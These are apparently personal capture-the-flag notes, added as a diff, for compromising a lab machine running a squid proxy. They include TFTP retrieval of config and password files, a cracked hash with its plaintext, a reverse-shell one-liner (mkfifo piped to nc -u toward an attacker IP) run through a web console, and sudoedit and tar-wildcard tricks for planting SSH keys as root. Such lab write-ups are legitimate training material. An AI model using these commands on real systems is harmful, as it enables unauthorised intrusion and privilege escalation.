@@ -1,0 +1,61 @@
+(Love this box, nc on udp, symbolic links to fool root, danger of wildcard)
+Hint:
+- tftp, get squid config file
+- SSRF
+- make process on background so it wouldn't block the web console
+- nc -u <ip> <port>
+- about sudo, and sudoedit
+- root backups files. Will he use '*'?
+
+Details:
+- if proxychains don't work directly, use burp as the middle man. (but still has some issue?)
+- one line output => use base64 to ease it
+- the version of the sudoedit exploit doesn't match. But read its flag "sudoedit_follow"
+    - alternative: sudoedit -u alekos /var/www/ .ssh/authorized_keys /layout.html  (it is three files, but meets the /var/www/*/*/layout.html)
+- `touch -- -al` to create a file called `-al`
+- https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+logs:
+# init
+22/tcp   open  ssh
+3128/tcp open  squid-http 3.5.12
+
+
+
+# squid http
+set firefox proxy to use squid => ask for http cred "the site says 'kalamari'"
+
+`nmap --script http-proxy-brute -p 3128 10.10.10.21` => (false positive)
+
+
+# tftp
+tftp 10.10.10.21
+tftp> get /etc/squid/squid.conf
+cat squid.conf | grep -v ^\# | grep . => get lines not starting with \# and having content
+=> find password file name
+tftp> get <that file>
+=> kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+john => ihateseafood
+
+# user shell
+proxychains dirb http://127.0.0.1 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 2>/dev/null
+=> /list, /console
+
+/console =>
+os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.19 8888 >/tmp/f &').read()
+note it is 'nc -u' for udp. So as the listener.
+
+sudoedit -u alekos /var/www/testing/mytest/layout.html => add our ssh pub key => shell of alekos
+
+# priv sec
+~/backup => root backups development folder every 5 mins
+
+## method 1
+ln -s /root/ development
+
+## method 2
+tar arbitrary command execution by wildcard
+touch -- --checkpoint=1
+touch -- '--checkpoint-action=exec=sh shell.sh'
+
+shell.sh just add my pub key to /root/.ssh/authorized_keys
